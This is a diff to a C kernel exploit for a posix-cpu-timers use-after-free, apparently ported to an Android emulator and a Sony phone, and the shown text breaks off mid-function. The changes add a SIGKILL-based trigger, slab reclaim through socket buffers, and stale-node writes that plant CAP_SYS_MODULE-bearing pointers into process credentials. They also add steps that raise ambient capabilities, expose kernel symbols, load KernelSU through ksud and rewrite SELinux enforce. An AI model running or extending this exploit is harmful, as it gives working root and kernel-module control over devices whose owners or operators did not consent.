@@ -1,14 +1,14 @@
-/*
+/**
  * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
- * Target : Sony A301SO, Android 15 build 67.2.A.3.178
- * Kernel : 5.15.189-android13-8-00016-g51bba4309aac-ab14546557
+ * Target : selected by one compile-time exact-profile parameter header
+ * Kernel : AVD Android 14 6.1 by default; A301SO 5.15 retained for diagnosis
  * SELinux: Enforcing
  * Patches: CVE fix absent in exact begin_new_exec() disassembly
  * Mitig. : KASLR=on PAN=on; HW-tag KASAN/MTE, KFENCE and SLUB hardening enabled
  *
  * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
- * The trigger, slab layout and offsets are the same; the do_timer_create
- * call site and the tracefs event ids are per-build and are re-derived here.
+ * The selected header owns trigger semantics, slab geometry, structure layout,
+ * call sites, and symbols. Tracefs event ids remain runtime discoveries.
  *
  * Two endgames:
  *
@@ -18,12 +18,12 @@
  *     shell-domain root with only the bounding-set capabilities.
  *
  *   fake
- *     Point task->cred at a fake full-capability cred in the reclaimed
- *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
- *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
- *     blob.  The worker execs ksud late-load, which resolves the installed
- *     manager's libksud.so and loads the matching android13-5.15 module.
- *     The parent parks with its socket buffers holding the fake cred page.
+ *     Plant reclaimed-node pointers into the child's real cred capability
+ *     fields; only values carrying the CAP_SYS_MODULE bit are accepted.  The
+ *     simplified KSU route plants Inheritable and Permitted, clears uid/gid,
+ *     raises Ambient after setuid(0), and execs the manager's kallsyms-aware
+ *     ksud loader.  This removes the former fake-cred lifetime and refcount
+ *     constraint while retaining capability across exec.
  *
  * The trigger leaves a stale timerqueue node; every failed plant parks
  * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
@@ -53,7 +53,7 @@
 #include <sys/resource.h>
 #include <sys/stat.h>
 
-#include "a301so_515_params.h"
+#include "target_params.h"
 
 #define TR GLK98260_TRACEFS
 #define CPU_TRIG GLK98260_TRIGGER_CPU
@@ -93,6 +93,8 @@ struct child_report
     int setgid_ret, setgid_errno;
     int setuid_ret, setuid_errno;
     int ruid, reuid, rsuid;
+    int fsuid, fsgid;
+    int ambient_ret, ambient_errno;
 };
 
 /**
@@ -103,7 +105,7 @@ struct child_report
  * @param rep Output report, valid only when the function returns zero.
  * @return Zero for a complete report with the expected magic, otherwise -1.
  * @note VERIFY does not release the child; COMMIT advances it to setresgid/setuid.
- * @note Stage: A301SO real-cred write verification before fake/KSU is allowed.
+ * @note Stage: target real-cred write verification before fake/KSU is allowed.
  */
 static int child_command_report(int go_fd, int st_fd, char command,
                                 struct child_report *rep)
@@ -121,6 +123,9 @@ static int child_command_report(int go_fd, int st_fd, char command,
 }
 
 static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
+#if GLK98260_EXEC_MMAP_HAS_KILLABLE_MMAP_LOCK
+static _Atomic int g_exec_tid, g_target_tgid;
+#endif
 static void *g_frag_base;
 static size_t g_frag_len;
 static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
@@ -175,6 +180,35 @@ static int wr(const char *p, const char *s)
     close(fd);
     return r < 0 ? -1 : 0;
 }
+
+/**
+ * @brief Enlarge every per-CPU trace ring before event-id calibration.
+ * @return Zero when the kernel reports at least the requested size, else -1.
+ * @note The AVD default is only 7 KiB and overwrites the allocation half of
+ *       the alloc/free calibration before the raw reader can pair PFNs.
+ * @note Stage: ids preflight; failure stops before any vulnerability trigger.
+ */
+static int configure_trace_buffer(void)
+{
+    char requested[32];
+    unsigned actual = 0;
+    FILE *f;
+
+    (void)snprintf(requested, sizeof(requested), "%u",
+                   GLK98260_TRACE_BUFFER_KB);
+    if (wr(TR "/buffer_size_kb", requested) != 0)
+        return -1;
+    f = fopen(TR "/buffer_size_kb", "r");
+    if (!f)
+        return -1;
+    if (fscanf(f, "%u", &actual) != 1)
+        actual = 0;
+    fclose(f);
+    logf("[trace] buffer_size_kb=%u requested=%u\n", actual,
+         GLK98260_TRACE_BUFFER_KB);
+    return actual >= GLK98260_TRACE_BUFFER_KB ? 0 : -1;
+}
+
 static void pin(int cpu)
 {
     cpu_set_t set;
@@ -780,6 +814,7 @@ static int locker_fn(void *x)
     }
     _exit(0);
 }
+#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
 /**
  * @brief Queue a real coredump writer on the shared old mm.
  * @param x Unused clone argument.
@@ -802,6 +837,36 @@ static int coredump_fn(void *x)
     for (;;)
         pause();
 }
+#else
+/**
+ * @brief Deliver SIGKILL after the exec thread has entered exec_mmap.
+ * @param x Unused clone argument.
+ * @return Zero only after the fatal signal is sent and lockers are stopped.
+ * @note This helper requires mmap_read_lock_killable in exact exec_mmap.
+ * @note Stage: create the stale timerqueue node on the AVD 6.1 profile.
+ */
+static int killer_fn(void *x)
+{
+    int tid, tgid;
+
+    (void)x;
+    pin(CPU_TRIG);
+    while (!(tid = atomic_load(&g_exec_tid)))
+        sched_yield();
+    tgid = atomic_load(&g_target_tgid);
+    for (;;)
+    {
+        long r = syscall(SYS_tgkill, tgid, tid, 0);
+
+        if (r < 0 && errno == ESRCH)
+            break;
+        sched_yield();
+    }
+    (void)syscall(SYS_tgkill, tgid, tgid, SIGKILL);
+    atomic_store(&g_stop, 1);
+    _exit(0);
+}
+#endif
 static int spawn_vm_helper(int (*fn)(void *))
 {
     void *st = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
@@ -848,6 +913,9 @@ static void *exec_thread(void *x)
     }
     {
         int tid = (int)syscall(SYS_gettid);
+#if GLK98260_EXEC_MMAP_HAS_KILLABLE_MMAP_LOCK
+        atomic_store(&g_exec_tid, tid);
+#endif
         if (write(g_tid_w, &tid, sizeof(tid)) != sizeof(tid))
             _exit(122);
     }
@@ -865,12 +933,14 @@ static void *exec_thread(void *x)
         sched_yield();
     for (volatile unsigned long i = 0; i < GLK98260_CORE_PRE_EXEC_SPINS; i++)
         __asm__ volatile("" ::: "memory");
+#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
     atomic_store(&g_locker_cpu, GLK98260_CORE_GO_SENTINEL);
     while (atomic_load(&g_locker_cpu) != GLK98260_CORE_RAISE_SENTINEL)
         sched_yield();
     for (volatile unsigned long i = 0;
          i < GLK98260_CORE_POST_RAISE_SPINS; i++)
         __asm__ volatile("" ::: "memory");
+#endif
     execve("/proc/self/exe", argv, envp);
     _exit(123);
 }
@@ -879,20 +949,30 @@ static void run_target(void)
 {
     pthread_t th;
     sigset_t set;
+#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
     struct rlimit core_limit = {
         .rlim_cur = (rlim_t)GLK98260_CORE_LIMIT_BYTES,
         .rlim_max = (rlim_t)GLK98260_CORE_LIMIT_BYTES};
+#else
+    atomic_store(&g_target_tgid, (int)getpid());
+#endif
 
-    pin(2);
+    pin(CPU_TRIG);
+#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
     if (setrlimit(RLIMIT_CORE, &core_limit) != 0 ||
         prctl(PR_SET_DUMPABLE, 1, 0, 0, 0) != 0)
         _exit(109);
+#endif
     if (prepare_fragmented_range())
         _exit(110);
     for (int i = 0; i < LOCKERS; i++)
         if (spawn_vm_helper(locker_fn) < 0)
             _exit(111);
+#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
     if (spawn_vm_helper(coredump_fn) < 0)
+#else
+    if (spawn_vm_helper(killer_fn) < 0)
+#endif
         _exit(112);
     sigemptyset(&set);
     sigaddset(&set, SIGRTMIN);
@@ -933,11 +1013,26 @@ static void park_forever(const char *why)
         pause();
 }
 
-/*
+/**
+ * @brief Stop a not-yet-released target and every CLONE_VM helper it owns.
+ * @param pid Target process and process-group id established after fork.
+ * @return No value; the direct target is synchronously reaped.
+ * @note The separate locker/killer helpers inherit the target process group;
+ *       killing only the leader would orphan helpers that retain the adb pipe.
+ * @note Stage: bounded pre-trigger cancellation before a stale node can exist.
+ */
+static void terminate_target_tree(pid_t pid)
+{
+    (void)kill(-pid, SIGKILL);
+    (void)kill(pid, SIGKILL);
+    (void)waitpid(pid, NULL, 0);
+}
+
+/**
  * Stale timer node layout inside the reclaimed order-1 page.
  *   zero: parent=0 -> rb_erase writes 0 to target.
- *   fake: parent=node -> rb_erase writes node to target (task->cred); the
- *         fake cred fields are overlaid at the same offset by run_plant.
+ *   ptr: parent=node -> rb_erase writes node to target.  The KernelSU route
+ *        accepts only node values whose CAP_SYS_MODULE bit is set.
  */
 static void build_payload(unsigned char *buf, size_t off,
                           unsigned long long parent, unsigned long long target)
@@ -947,13 +1042,19 @@ static void build_payload(unsigned char *buf, size_t off,
     *(unsigned long long *)(buf + off + GLK98260_RB_LEFT_OFF) = target;
 }
 
-/* GhostLock's final stage, reduced to its root-child handoff. */
-static void write_ksu_script(void)
+/**
+ * @brief Copy the manager's ksud executable to a stable shell-owned path.
+ * @return Zero only when the copied loader exists and is non-empty.
+ * @note The preparation process runs with ordinary shell credentials; the
+ *       capability-bearing child later execs this exact loader with ambient
+ *       CAP_SYS_MODULE so ksud can perform its kallsyms-aware module load.
+ * @note Stage: non-destructive KSU asset preparation before stale-node plants.
+ */
+static int prepare_ksud(void)
 {
     static const char script[] =
         "#!/system/bin/sh\n"
-        "echo \"[ksu] start uid=$(id -u) selinux=$(getenforce)\"\n"
-        "grep -E '^(Cap|Seccomp)' /proc/self/status\n"
+        "set -e\n"
         "PKG=me.weishu.kernelsu\n"
         "APK=$(pm path \"$PKG\" 2>/dev/null | head -1 | cut -d: -f2)\n"
         "KSUD=''\n"
@@ -965,26 +1066,147 @@ static void write_ksu_script(void)
         "[ -x \"$KSUD\" ] || KSUD=/data/adb/ksu/bin/ksud\n"
         "if [ ! -x \"$KSUD\" ]; then echo '[ksu] ksud missing'; exit 1; fi\n"
         "echo \"[ksu] ksud=$KSUD version=$(\"$KSUD\" --version 2>&1 | head -1)\"\n"
-        "\"$KSUD\" late-load --kmi " GLK98260_KSU_KMI " --allow-shell "
-        "--package-name me.weishu.kernelsu\n"
-        "echo \"[ksu] late-load rc=$?\"\n"
-        "i=0\n"
-        "while [ $i -lt 50 ]; do\n"
-        "  grep -q '^kernelsu ' /proc/modules && break\n"
-        "  i=$((i+1)); sleep 0.1\n"
-        "done\n"
-        "if grep -q '^kernelsu ' /proc/modules; then echo KSU_LOADED; "
-        "else echo KSU_MISSING; fi\n"
-        "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
-        "echo \"[ksu] enforce=$(getenforce)\"\n";
-    int fd = open("/data/local/tmp/ksu_stage.sh",
+        "cat \"$KSUD\" > " GLK98260_KSUD_PATH "\n"
+        "chmod 0755 " GLK98260_KSUD_PATH "\n"
+        "echo \"[ksu] prepared path=" GLK98260_KSUD_PATH
+        " bytes=$(wc -c < " GLK98260_KSUD_PATH ")\"\n";
+    int fd = open(GLK98260_KSU_PREPARE_SCRIPT_PATH,
                   O_WRONLY | O_CREAT | O_TRUNC, 0755);
+    struct stat st;
+    int status = 0;
+    pid_t child;
 
     if (fd < 0)
-        return;
-    (void)!write(fd, script, sizeof(script) - 1);
+        return -1;
+    if (write(fd, script, sizeof(script) - 1) !=
+        (ssize_t)(sizeof(script) - 1))
+    {
+        close(fd);
+        return -1;
+    }
     close(fd);
-    (void)chmod("/data/local/tmp/ksu_stage.sh", 0755);
+    (void)chmod(GLK98260_KSU_PREPARE_SCRIPT_PATH, 0755);
+    child = fork();
+    if (child == 0)
+    {
+        char *const av[] = {(char *)"sh",
+                            (char *)GLK98260_KSU_PREPARE_SCRIPT_PATH, NULL};
+        char *const ep[] = {
+            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
+            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
+            NULL};
+
+        execve("/system/bin/sh", av, ep);
+        _exit(127);
+    }
+    if (child < 0 || waitpid(child, &status, 0) != child ||
+        !WIFEXITED(status) || WEXITSTATUS(status) != 0 ||
+        stat(GLK98260_KSUD_PATH, &st) != 0 || st.st_size <= 0)
+    {
+        logf("[-] KSU loader preparation failed status=%#x errno=%d\n",
+             status, errno);
+        return -1;
+    }
+    logf("[ksu] loader prepared bytes=%lld\n", (long long)st.st_size);
+    return 0;
+}
+
+/**
+ * @brief Check whether the KernelSU LKM is present in the live module list.
+ * @return One when a kernelsu record is visible, otherwise zero.
+ * @note Stage: post-ksud readback before reporting KSU success.
+ */
+static int kernelsu_module_loaded(void)
+{
+    char line[256];
+    FILE *f = fopen("/proc/modules", "r");
+
+    if (!f)
+        return 0;
+    while (fgets(line, sizeof(line), f))
+    {
+        if (!strncmp(line, "kernelsu ", 9))
+        {
+            fclose(f);
+            return 1;
+        }
+    }
+    fclose(f);
+    return 0;
+}
+
+/**
+ * @brief Restore SELinux enforcing after the ksud module load.
+ * @return Zero only when the enforce byte is written and reads back as one.
+ * @note The caller is already uid/gid zero and retains ambient capability
+ *       across the worker exec before this cleanup step.
+ * @note Stage: KSU cleanup after the module-presence readback.
+ */
+static int restore_selinux_enforcing(void)
+{
+    char value = '0';
+    int fd = open("/sys/fs/selinux/enforce", O_WRONLY);
+
+    if (fd < 0 || write(fd, "1", 1) != 1)
+    {
+        if (fd >= 0)
+            close(fd);
+        return -1;
+    }
+    close(fd);
+    fd = open("/sys/fs/selinux/enforce", O_RDONLY);
+    if (fd < 0 || read(fd, &value, 1) != 1)
+    {
+        if (fd >= 0)
+            close(fd);
+        return -1;
+    }
+    close(fd);
+    return value == '1' ? 0 : -1;
+}
+
+/**
+ * @brief Read the live kernel pointer-display policy.
+ * @return The numeric kptr_restrict value, or -1 when it cannot be read.
+ * @note Stage: KSU loader preparation after uid/gid and capability promotion.
+ */
+static int read_kptr_restrict(void)
+{
+    FILE *f = fopen(GLK98260_KPTR_RESTRICT_PATH, "r");
+    int value = -1;
+
+    if (!f)
+        return -1;
+    if (fscanf(f, "%d", &value) != 1)
+        value = -1;
+    fclose(f);
+    return value;
+}
+
+/**
+ * @brief Set and read back the kernel pointer-display policy.
+ * @param value Numeric kptr_restrict value to publish through procfs.
+ * @return Zero only when the write succeeds and the same value reads back.
+ * @note The caller must have uid zero and must run while SELinux is permissive.
+ * @note Stage: bounded KSU loader setup or cleanup outside the stale-node window.
+ */
+static int set_kptr_restrict(int value)
+{
+    char text[16];
+    int len = snprintf(text, sizeof(text), "%d\n", value);
+    int fd;
+
+    if (len <= 0 || (size_t)len >= sizeof(text))
+        return -1;
+    fd = open(GLK98260_KPTR_RESTRICT_PATH, O_WRONLY);
+    if (fd < 0 || write(fd, text, (size_t)len) != len)
+    {
+        if (fd >= 0)
+            close(fd);
+        return -1;
+    }
+    close(fd);
+    return read_kptr_restrict() == value ? 0 : -1;
 }
 
 static int read_panic_on_warn(void)
@@ -1002,6 +1224,76 @@ static int read_panic_on_warn(void)
     return value;
 }
 
+/**
+ * @brief Read one hexadecimal capability field from a blocked child status.
+ * @param pid Credential child process id.
+ * @param field Status key without the trailing colon, such as CapEff.
+ * @return Parsed value, or zero when the proc record cannot be verified.
+ * @note The child remains blocked on its command pipe throughout this read.
+ * @note Stage: verify the real-cred CAP_SYS_MODULE pointer plant before KSU.
+ */
+static unsigned long long read_child_status_hex(pid_t pid, const char *field)
+{
+    char path[64], line[256];
+    size_t field_len = strlen(field);
+    unsigned long long value = 0;
+    FILE *f;
+
+    (void)snprintf(path, sizeof(path), "/proc/%d/status", pid);
+    f = fopen(path, "r");
+    if (!f)
+        return 0;
+    while (fgets(line, sizeof(line), f))
+    {
+        if (strncmp(line, field, field_len) != 0 || line[field_len] != ':')
+            continue;
+        if (sscanf(line + field_len + 1, "%llx", &value) != 1)
+            value = 0;
+        break;
+    }
+    fclose(f);
+    return value;
+}
+
+/**
+ * @brief Verify the post-exec capability sets and enter ksud late-load.
+ * @return Does not return on success; returns a nonzero diagnostic on failure.
+ * @note The first exec converts Ambient CAP_SYS_MODULE into Effective.  A
+ *       second ordinary exec into ksud retains the same ambient capability.
+ * @note Stage: KSU loader boundary after the real-cred write sequence.
+ */
+static int ksu_worker_main(void)
+{
+    unsigned long long cap_amb = read_child_status_hex(getpid(), "CapAmb");
+    unsigned long long cap_eff = read_child_status_hex(getpid(), "CapEff");
+    unsigned long long cap_inh = read_child_status_hex(getpid(), "CapInh");
+    unsigned long long cap_prm = read_child_status_hex(getpid(), "CapPrm");
+    int kptr_restrict = read_kptr_restrict();
+    char *const av[] = {
+        (char *)GLK98260_KSUD_PATH, (char *)"late-load",
+        (char *)"--kmi", (char *)GLK98260_KSU_KMI,
+        (char *)"--allow-shell", (char *)"--package-name",
+        (char *)"me.weishu.kernelsu", NULL};
+    char *const ep[] = {
+        (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
+        (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
+        (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
+        NULL};
+
+    logf("[ksu-worker] CapInh=%#llx CapPrm=%#llx CapEff=%#llx "
+         "CapAmb=%#llx kptr_restrict=%d\n",
+         cap_inh, cap_prm, cap_eff, cap_amb, kptr_restrict);
+    if (!(cap_inh & GLK98260_CAP_SYS_MODULE_MASK) ||
+        !(cap_prm & GLK98260_CAP_SYS_MODULE_MASK) ||
+        !(cap_eff & GLK98260_CAP_SYS_MODULE_MASK) ||
+        !(cap_amb & GLK98260_CAP_SYS_MODULE_MASK) ||
+        kptr_restrict != GLK98260_KPTR_RESTRICT_VISIBLE)
+        return 4;
+    execve(GLK98260_KSUD_PATH, av, ep);
+    logf("[-] ksud exec failed errno=%d\n", errno);
+    return 127;
+}
+
 struct plant_res
 {
     unsigned long long A;
@@ -1011,6 +1303,7 @@ struct plant_res
 
 static void run_plant(unsigned long long target, int tag, int mode,
                       struct plant_res *res, unsigned char *raw);
+static void drain_pool(void);
 
 static int stage_write(unsigned long long target, int mode,
                        const char *what, unsigned char *raw,
@@ -1018,12 +1311,15 @@ static int stage_write(unsigned long long target, int mode,
 {
     struct plant_res r;
 
-    for (int attempt = 1; attempt <= 3; attempt++)
+    for (unsigned attempt = 1;
+         attempt <= GLK98260_STAGE_WRITE_ATTEMPTS; attempt++)
     {
         memset(&r, 0, sizeof(r));
-        logf("[+] stage %s target=%#llx mode=%s attempt=%d\n", what, target,
-             mode == 2 ? "fake" : "zero", attempt);
+        logf("[+] stage %s target=%#llx mode=%s attempt=%u\n", what, target,
+             mode == 2 ? "fake" : (mode == 1 ? "ptr" : "zero"), attempt);
         run_plant(target, 1, mode, &r, raw);
+        if (mode != 2 && r.retry)
+            drain_pool();
         if (r.ok)
         {
             if (out)
@@ -1080,7 +1376,9 @@ static int ensure_pool(void)
                        sizeof(snd)) ||
             getsockopt(g_pool[i][0], SOL_SOCKET, SO_SNDBUF, &actual,
                        &actual_len) ||
-            actual_len != sizeof(actual))
+            actual_len != sizeof(actual) ||
+            fcntl(g_pool[i][1], F_SETFL,
+                  fcntl(g_pool[i][1], F_GETFL) | O_NONBLOCK) != 0)
             break;
         if (actual < g_pool_sndbuf_min)
             g_pool_sndbuf_min = actual;
@@ -1107,6 +1405,33 @@ static int ensure_pool(void)
             return -1;
     }
     return 0;
+}
+
+/**
+ * @brief Release socket payloads after a clean-retry plant.
+ * @return No value; every receiver is drained until it would block.
+ * @note A retry has no stale node.  Successful stages retain their payloads
+ *       to preserve the allocator pressure accounted by the stage preflight;
+ *       draining them disturbed later buddy-page selection on this AVD.
+ * @note Stage: bounded retry cleanup between independent write attempts.
+ */
+static void drain_pool(void)
+{
+    unsigned char buffer[16384];
+    unsigned long long bytes = 0;
+
+    for (int i = 0; i < g_pool_n; i++)
+    {
+        ssize_t n;
+
+        do
+        {
+            n = read(g_pool[i][1], buffer, sizeof(buffer));
+            if (n > 0)
+                bytes += (unsigned long long)n;
+        } while (n > 0);
+    }
+    logf("[pool] drained=%llu\n", bytes);
 }
 
 static int ensure_raw(void)
@@ -1172,6 +1497,14 @@ static int scan_page_alloc_ours(const unsigned char *b, size_t n,
     return 0;
 }
 
+/**
+ * @brief Hold the selected socket payload across the two reclaim bursts.
+ * @param x Pointer to the immutable socket range and payload for this worker.
+ * @return NULL after both bursts or after the parent requests cancellation.
+ * @note Cancellation is checked at every wait boundary so an exec-success
+ *       retry cannot deadlock while joining workers that never saw burst one.
+ * @note Stage: controlled order-1 reclaim after the target trigger exits.
+ */
 static void *spray_thread(void *x)
 {
     struct spray_arg *a = x;
@@ -1179,8 +1512,10 @@ static void *spray_thread(void *x)
 
     atomic_store(&g_spray_tids[a->idx], (int)syscall(SYS_gettid));
     pin(a->cpu);
-    while (!atomic_load(&g_burst))
+    while (!atomic_load(&g_burst) && !atomic_load(&g_stop_spray))
         sched_yield();
+    if (atomic_load(&g_stop_spray))
+        return NULL;
     /* Phase 1 runs before the target execs; it catches an early free. */
     while (!atomic_load(&g_stop_spray) && w < SPRAY_PRE)
     {
@@ -1226,6 +1561,8 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     if (T == 0)
     {
+        if (setpgid(0, 0) != 0)
+            _exit(116);
         close(ready_p[0]);
         close(ack_p[1]);
         close(tid_p[0]);
@@ -1237,6 +1574,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         run_target();
         _exit(115);
     }
+    (void)setpgid(T, T);
     close(ready_p[1]);
     close(ack_p[0]);
     close(tid_p[1]);
@@ -1246,8 +1584,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     if (read(ready_p[0], &ch, 1) != 1)
     {
         logf("[-] plant%d trigger never ready\n", tag);
-        kill(T, SIGKILL);
-        waitpid(T, NULL, 0);
+        terminate_target_tree(T);
         return;
     }
     trace_start();
@@ -1274,8 +1611,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     if (!nrec || !site0)
     {
         trace_stop();
-        kill(T, SIGKILL);
-        waitpid(T, NULL, 0);
+        terminate_target_tree(T);
         logf("[-] plant%d victim not captured (recs=%d)\n", tag, nrec);
         return;
     }
@@ -1289,8 +1625,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         if (base != GLK98260_EXPECTED_PFN_TO_VIRT_BASE)
         {
             trace_stop();
-            kill(T, SIGKILL);
-            waitpid(T, NULL, 0);
+            terminate_target_tree(T);
             logf("[-] plant%d bad base=%#llx ns=%d np=%d recs=%d\n",
                  tag, base, ns, np, nrec);
             return;
@@ -1314,8 +1649,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     if (nkeep <= VICTIM_IDX)
     {
         trace_stop();
-        kill(T, SIGKILL);
-        waitpid(T, NULL, 0);
+        terminate_target_tree(T);
         logf("[-] plant%d victim index missing (kept=%d)\n", tag, nkeep);
         return;
     }
@@ -1329,8 +1663,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     if (site0 < STATIC_TIMER_SITE)
     {
         trace_stop();
-        kill(T, SIGKILL);
-        waitpid(T, NULL, 0);
+        terminate_target_tree(T);
         logf("[-] plant%d timer site underflow site=%#llx static=%#llx\n",
              tag, site0, STATIC_TIMER_SITE);
         return;
@@ -1345,11 +1678,28 @@ static void run_plant(unsigned long long target, int tag, int mode,
         payload = malloc(SOCKBUF);
         if (!payload)
         {
-            kill(T, SIGKILL);
-            waitpid(T, NULL, 0);
+            terminate_target_tree(T);
             return;
         }
-        if (mode == 2)
+        if (mode == 1)
+        {
+            unsigned long long node = V + GLK98260_TIMER_NODE_OFF;
+
+            if (!(node & GLK98260_CAP_SYS_MODULE_MASK))
+            {
+                logf("[-] plant%d ptr=%#llx lacks CAP_SYS_MODULE bit; retryable\n",
+                     tag, node);
+                terminate_target_tree(T);
+                free(payload);
+                payload = NULL;
+                res->retry = 1;
+                return;
+            }
+            build_payload(payload, off, node, target);
+            logf("[+] plant%d capability pointer=%#llx mask=%#llx\n",
+                 tag, node, GLK98260_CAP_SYS_MODULE_MASK);
+        }
+        else if (mode == 2)
         {
             unsigned long long page = V & ~GLK98260_TIMER_SLAB_MASK;
             unsigned long long node = V + GLK98260_TIMER_NODE_OFF;
@@ -1370,8 +1720,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             {
                 logf("[-] plant%d fake usage=%#x outside refcount range; retryable\n",
                      tag, usage);
-                kill(T, SIGKILL);
-                waitpid(T, NULL, 0);
+                terminate_target_tree(T);
                 free(payload);
                 payload = NULL;
                 res->retry = 1;
@@ -1381,8 +1730,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             {
                 logf("[-] plant%d fake cred spills off=%#zx; retryable\n",
                      tag, off);
-                kill(T, SIGKILL);
-                waitpid(T, NULL, 0);
+                terminate_target_tree(T);
                 free(payload);
                 payload = NULL;
                 res->retry = 1;
@@ -1405,8 +1753,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
             }
             if (!fit)
             {
-                kill(T, SIGKILL);
-                waitpid(T, NULL, 0);
+                terminate_target_tree(T);
                 free(payload);
                 payload = NULL;
                 res->retry = 1;
@@ -1506,7 +1853,11 @@ static void run_plant(unsigned long long target, int tag, int mode,
     }
     logf("[+] plant%d target=%d etid=%d zombie code=%d status=%d\n",
          tag, T, etid, si.si_code, si.si_status);
+#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
     if (si.si_code != CLD_KILLED && si.si_code != CLD_DUMPED)
+#else
+    if (si.si_code != CLD_KILLED || si.si_status != SIGKILL)
+#endif
     {
         atomic_store(&g_stop_spray, 1);
         atomic_store(&g_burst2, 1);
@@ -1529,6 +1880,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         g_held++;
         return;
     }
+#if GLK98260_TRIGGER_HAS_CORE_STATE_COREDUMP
     if (si.si_code == CLD_DUMPED && si.si_status != SIGSEGV)
     {
         atomic_store(&g_stop_spray, 1);
@@ -1541,6 +1893,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
         g_held++;
         return;
     }
+#endif
     atomic_store(&g_burst, 1);
     /*
      * Phase 1 is already spraying.  When the victim page is freed, release
@@ -1600,7 +1953,7 @@ static void run_plant(unsigned long long target, int tag, int mode,
     res->A = V + GLK98260_TIMER_NODE_OFF;
     res->ok = 1;
     logf("[+] plant%d write mode=%s target=%#llx\n", tag,
-         mode == 2 ? "fake" : "zero", target);
+         mode == 2 ? "fake" : (mode == 1 ? "ptr" : "zero"), target);
     free(payload);
 }
 
@@ -1753,34 +2106,115 @@ static int wait_child_main(const char *mode)
 
     if (!strcmp(mode, "fake"))
     {
-        char *const envp[] = {
-            (char *)"PATH=/system/bin:/system/xbin:/sbin:/vendor/bin",
-            (char *)"HOME=/", (char *)"TMPDIR=/data/local/tmp",
-            (char *)"ANDROID_DATA=/data", (char *)"ANDROID_ROOT=/system",
-            NULL};
-        int st = 0;
-        pid_t w;
+        unsigned long long cap_amb, cap_eff, cap_inh, cap_prm;
+        int loaded = 0;
+        int kptr_restrict_original = -1;
+        int kptr_restrict_restore_ret = -1;
+        int selinux_restore_ret = -1;
+        int worker_status = 0;
+        pid_t worker;
 
+        /**
+         * The real uid/gid fields are already zero.  With inheritable and
+         * permitted planted first, the ordinary setuid transition makes the
+         * capability effective; ambient CAP_SYS_MODULE then preserves it
+         * across the direct ksud exec.
+         */
+        errno = 0;
+        rep.setgid_ret = (int)syscall(SYS_setresgid, 0, 0, 0);
+        rep.setgid_errno = errno;
+        errno = 0;
+        rep.setuid_ret = (int)syscall(SYS_setuid, 0);
+        rep.setuid_errno = errno;
+        errno = 0;
+        rep.ambient_ret = prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE,
+                                GLK98260_CAP_SYS_MODULE_NR, 0UL, 0UL);
+        rep.ambient_errno = errno;
+        {
+            uid_t ru = 0, eu = 0, su = 0;
+
+            getresuid(&ru, &eu, &su);
+            rep.ruid = (int)ru;
+            rep.reuid = (int)eu;
+            rep.rsuid = (int)su;
+        }
+        rep.fsgid = (int)syscall(SYS_setfsgid, (gid_t)-1);
+        rep.fsuid = (int)syscall(SYS_setfsuid, (uid_t)-1);
         (void)write(4, &rep, sizeof(rep));
         close(4);
-        logf("[fake] child uid=%d euid=%d; forking worker\n",
-             rep.uid, rep.euid);
-        w = fork();
-        if (w == 0)
+        cap_inh = read_child_status_hex(getpid(), "CapInh");
+        cap_prm = read_child_status_hex(getpid(), "CapPrm");
+        cap_eff = read_child_status_hex(getpid(), "CapEff");
+        cap_amb = read_child_status_hex(getpid(), "CapAmb");
+        logf("[ksu] loader resuid=%d/%d/%d fsuid=%d fsgid=%d "
+             "ambient=%d/%d CapInh=%#llx CapPrm=%#llx CapEff=%#llx "
+             "CapAmb=%#llx\n",
+             rep.ruid, rep.reuid, rep.rsuid, rep.fsuid, rep.fsgid,
+             rep.ambient_ret, rep.ambient_errno, cap_inh, cap_prm, cap_eff,
+             cap_amb);
+        if (rep.setgid_ret != 0 || rep.setuid_ret != 0 ||
+            rep.ambient_ret != 0 ||
+            !(cap_inh & GLK98260_CAP_SYS_MODULE_MASK) ||
+            !(cap_prm & GLK98260_CAP_SYS_MODULE_MASK) ||
+            !(cap_amb & GLK98260_CAP_SYS_MODULE_MASK))
+            _exit(4);
+        kptr_restrict_original = read_kptr_restrict();
+        if (kptr_restrict_original < 0 ||
+            set_kptr_restrict(GLK98260_KPTR_RESTRICT_VISIBLE) != 0)
         {
-            char *const av[] = {(char *)"sh",
-                                (char *)"/data/local/tmp/ksu_stage.sh", NULL};
+            logf("[-] KSU kallsyms setup failed original=%d errno=%d\n",
+                 kptr_restrict_original, errno);
+            (void)restore_selinux_enforcing();
+            _exit(5);
+        }
+        logf("[ksu] kptr_restrict=%d original=%d\n",
+             GLK98260_KPTR_RESTRICT_VISIBLE, kptr_restrict_original);
+        worker = fork();
+        if (worker == 0)
+        {
+            char *const av[] = {(char *)"/proc/self/exe",
